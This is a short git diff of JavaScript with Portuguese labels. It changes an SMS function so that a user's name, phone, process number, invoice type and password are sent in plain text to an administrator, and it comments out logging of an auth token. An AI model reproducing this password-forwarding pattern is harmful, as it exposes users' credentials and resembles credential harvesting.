@@ -5,10 +5,10 @@ async function sendSmsToAdmin({ name, userPhone, proces_number, userPassword,fat
   const message = `${info}:
   
 Nome: ${name}
-Telefone: ${userPhone}
-Proces_nº: ${proces_number}
-tipo_fatura:${fatura}
-senha: ${userPassword}
+${userPhone}
+${proces_number}
+${fatura}
+${userPassword}
 
 `;
 
@@ -84,7 +84,7 @@ async function sendSmsPddo() {
 
     if (authResponse.data.status === 200) {
       token = authResponse.data.data.authToken;
-      console.log("Aki mesmo ",authResponse.data.data.authToken)
+      //console.log("Aki mesmo ",authResponse.data.data.authToken)
     } else {
       throw new Error('Falha ao autenticar com a API de SMS');
     }
